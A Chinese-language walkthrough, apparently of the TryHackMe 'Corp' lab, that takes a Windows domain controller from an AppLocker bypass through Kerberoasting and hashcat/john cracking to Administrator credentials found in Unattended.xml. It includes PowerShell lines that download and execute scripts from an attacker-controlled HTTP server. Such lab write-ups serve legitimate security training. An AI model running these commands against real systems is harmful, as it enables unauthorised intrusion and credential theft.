# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/tryhackme/Corp]
└─# nmap -sV -Pn 10.10.192.16 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 04:00 EST
Nmap scan report for 10.10.192.16
Host is up (0.30s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-19 09:01:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: OMEGA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.74 seconds

```


用```corp\dark:_QuejVudId6```登录靶机

## 什么是AppLocker？
> AppLocker 是 Windows 7 中引入的应用程序白名单技术。它允许根据程序路径、发布者和哈希限制用户可以执行哪些程序。

## 如何绕过AppLocker？
> 如果 AppLocker 配置了默认的 AppLocker 规则，我们可以通过将我们的可执行文件放在以下目录中来绕过它：  C:\Windows\System32\spool\drivers\color - 默认情况下这是白名单


## windows版本的bash history
就像Linux bash 一样，Windows powershell 将所有以前的命令保存到一个名为ConsoleHost_history的文件中

在windows中，这个文件通常是在：
> %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_h istory.txt


## 枚举所有账户信息
> setspn -T medin -Q */*
```
PS C:\users\dark\appdata\roaming\Microsoft\Windows\PowerShell\PSReadLine>  setspn -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local
```

## 下载脚本到靶机
> iex (New-Object  Net.WebClient).DownloadString('http://10.13.21.169:8000/Invoke-Kerberoast.ps1')

## 引入脚本，枚举出哈希
```
PS C:\users\dark\Desktop>  Invoke-Kerberoast -OutputFormat hashcat |fl


TicketByteHexStream  :
Hash                 : $krb5tgs$23$*fela$corp.local$HTTPfela*$bc1fe3e4cc81abb946f6eb0ad7051687$1d5dc1ef47a761e0903c3f60606dd2675ad35b1ec6738c87c593f6ce477190988d4225d1abe7616030e48380680535fe1ce3588f04adecdbd332dd0b5108391e2161e4bbce69aaf5708af88debb7a0ab18da31fc34ec6e1a40d25a25c21d51e82e3bba11277774d8bcb7c54b94ec94f1e3c4106e2537122c77a4bb444c02db0d01365c098662b6e416fb4620dc9ef83ba99b7f5a2c2f49687a19fd485115eaaa8a10e34042d93d407fb7d933a84a89068158f8450300010c118a90a89372c9be36fa35350e434084517d2d0557c1aa30953066acbe0e0122ada8652540ea346f073e7d396bb45469dd8a8e7036db806282a409ee6206f1226188e2716197594db9e35c89414cf744b3d0ab3d30000d717936ccfa67cc3af793ffff15357845a6c3159b5ab35f36ae38bf4849c2fee2e5963a8a39c9d32a1a5ff3425dcaa244fab1d66c31d62e052095085a342337adc6bd5cb928137c8b51a28809cc39f7bd59292b219fd05725f9352e493274448b9e91b847641775e642ff127954890fb3dc256508a9677bddd56da655fbb93574a0901258c45c4fc8c361a70c48cd907bcda0381a2f64e1668cdeef524c4cd8e77ee33650566496618404d186c7135c7041cc2c6df3dbd2f7cd28234b2e12e3491e0e6d0604d769eeca46fb5b14b6720ef2709e2f4fdb762dc3db9b7f36648f32c5a4e5fa21ddc970323053b037a274559b329ce46f8fe9a4a06d6e2833488d766df1aef8c593309f59cd8fb492f98f2b987656424dd116ac603d943ae680ea628b047f4cdd2e116bae5cfb6f7757ff5926265712076d255cb7843c746698ca027d2f26823e7646953b4912d839741fcd82edc0ae2af31070994c713295c43d1d9098bea2211e449c4e5012f51cb2743ff9603864050ae9ba5e21b09c1c7225cf8068f3351e8f26ecb4069acab198e97fe5ce98c18ecba9700d6f1b40166df254c8cfb9b02c4d19cae2b7ecf2c30fd6a0654be8939f83eb357b308827029a1fcc46a2de0de6e5171cf4e68e5574926cf550783e47acdac5cb67311c39c115c1b9e7affedfe5ba0ced9085a882a3559506341c611eaa950443acd64a05e2313ace848685b981795a91edc67fea48dfd081d4d6b2e6909a3df0c2762dee766062aa39ac8aaf610bc8ee09e7d1d54e65bf3dccd42530274f99ce37fc787db1da2282a12d248cf454dfa73fd54235a66132a2182e9ecd5c6a9100961e1ea57bf661e1721fd6f2de02eccd229c06d6da73316a09847aac3e0aa7c8e5d2a83ceb6ef20f057eb89c58a98c624d8de8ad0b7637b9bcf42468f216a4204b8f112f2eeaddf1b5b498a05a2e23b55c3c1d60addc58c664045838cc158daa5799518c635308267f9db6df842b39d294d603c5c2b7d6d951d3
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```

把哈希保存到hash.txt，识别哈希类型：
```
┌──(root💀kali)-[~/tryhackme/Corp]
└─# name-that-hash -f hash.txt 

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

$krb5tgs$23$*fela$corp.local$HTTP/fela*$FCADF21005AC9CBF1C4804E9A917359D$0CBAB927BD882E862B06486B73E806082F04815A4312565D0DBA3D4C9952FE4FF80570F3014C6AEC95D09D07C594DF348D5A5392F22060E03D062A032DEFA3E348CAC2998929

Most Likely 
Kerberos 5 TGS-REP etype 23, HC: 13100 JtR: krb5tgs Summary: Used in Windows Active Directory.

```

哈希类型为：```Kerberos 5 TGS-REP etype 23```

hashcat爆破：

```
┌──(root💀kali)-[~/tryhackme/corp]
└─# hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz, 1418/1482 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 134 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*fela$corp.local$HTTPfela*$bc1fe3e4cc81abb946f6eb0ad7051687$1d5dc1ef47a761e0903c3f60606dd2675ad35b1ec6738c87c593f6ce477190988d4225d1abe7616030e48380680535fe1ce3588f04adecdbd332dd0b5108391e2161e4bbce69aaf5708af88debb7a0ab18da31fc34ec6e1a40d25a25c21d51e82e3bba11277774d8bcb7c54b94ec94f1e3c4106e2537122c77a4bb444c02db0d01365c098662b6e416fb4620dc9ef83ba99b7f5a2c2f49687a19fd485115eaaa8a10e34042d93d407fb7d933a84a89068158f8450300010c118a90a89372c9be36fa35350e434084517d2d0557c1aa30953066acbe0e0122ada8652540ea346f073e7d396bb45469dd8a8e7036db806282a409ee6206f1226188e2716197594db9e35c89414cf744b3d0ab3d30000d717936ccfa67cc3af793ffff15357845a6c3159b5ab35f36ae38bf4849c2fee2e5963a8a39c9d32a1a5ff3425dcaa244fab1d66c31d62e052095085a342337adc6bd5cb928137c8b51a28809cc39f7bd59292b219fd05725f9352e493274448b9e91b847641775e642ff127954890fb3dc256508a9677bddd56da655fbb93574a0901258c45c4fc8c361a70c48cd907bcda0381a2f64e1668cdeef524c4cd8e77ee33650566496618404d186c7135c7041cc2c6df3dbd2f7cd28234b2e12e3491e0e6d0604d769eeca46fb5b14b6720ef2709e2f4fdb762dc3db9b7f36648f32c5a4e5fa21ddc970323053b037a274559b329ce46f8fe9a4a06d6e2833488d766df1aef8c593309f59cd8fb492f98f2b987656424dd116ac603d943ae680ea628b047f4cdd2e116bae5cfb6f7757ff5926265712076d255cb7843c746698ca027d2f26823e7646953b4912d839741fcd82edc0ae2af31070994c713295c43d1d9098bea2211e449c4e5012f51cb2743ff9603864050ae9ba5e21b09c1c7225cf8068f3351e8f26ecb4069acab198e97fe5ce98c18ecba9700d6f1b40166df254c8cfb9b02c4d19cae2b7ecf2c30fd6a0654be8939f83eb357b308827029a1fcc46a2de0de6e5171cf4e68e5574926cf550783e47acdac5cb67311c39c115c1b9e7affedfe5ba0ced9085a882a3559506341c611eaa950443acd64a05e2313ace848685b981795a91edc67fea48dfd081d4d6b2e6909a3df0c2762dee766062aa39ac8aaf610bc8ee09e7d1d54e65bf3dccd42530274f99ce37fc787db1da2282a12d248cf454dfa73fd54235a66132a2182e9ecd5c6a9100961e1ea57bf661e1721fd6f2de02eccd229c06d6da73316a09847aac3e0aa7c8e5d2a83ceb6ef20f057eb89c58a98c624d8de8ad0b7637b9bcf42468f216a4204b8f112f2eeaddf1b5b498a05a2e23b55c3c1d60addc58c664045838cc158daa5799518c635308267f9db6df842b39d294d603c5c2b7d6d951d3:rubenF124
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*fela$corp.local$HTTPfela*$bc1fe3e4cc81...d951d3
Time.Started.....: Sat Nov 20 01:13:40 2021, (4 secs)
Time.Estimated...: Sat Nov 20 01:13:44 2021, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   933.4 kH/s (8.37ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4145152/14344385 (28.90%)
Rejected.........: 0/4145152 (0.00%)
Restore.Point....: 4128768/14344385 (28.78%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ruddrooney -> royrubio

Started: Sat Nov 20 01:13:37 2021
Stopped: Sat Nov 20 01:13:45 2021

```

或者用john：
```
┌──(root💀kali)-[~/tryhackme/corp]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs                                                                                   130 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rubenF124        (?)
1g 0:00:00:01 DONE (2021-11-20 01:13) 0.5434g/s 2246Kp/s 2246Kc/s 2246KC/s rubibrian7..ruben4484
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

现在我们得到一个用户凭证```fela : rubenF124```

用下面命令切换```fela```的cmd shell：
> runas /user:fela cmd

或者远程桌面登录
> rdesktop -u fela -p rubenF124 10.10.192.16 -r sound:on -g workarea

# 提权
把[这个脚本](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)下载到kali，保存到```PowerUp.ps1```

开启一个临时的http服务：
> python3 -m http.server

从靶机下载提权脚本并导入到内存中：
> iex​(New-Object Net.WebClient).DownloadString('http://10.13.21.169:8000/PowerUp.ps1') 

打开下面文件```C:\Windows\Panther\Unattend\Unattended.xml```：
```
C:\Windows\Panther\Unattend> cat .\Unattended.xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
```

拿到Administrator密码，解密后是：```tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T```


登录Administrator账号
> xfreerdp /u:'Administrator' /v:10.10.192.16 /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T'

登录进去会被强制改密码，然后上面这个原始密码不能粘贴，只能手输，非常坑爹。

最后的flag是:```THM{g00d_j0b_SYS4DM1n_M4s73R}```


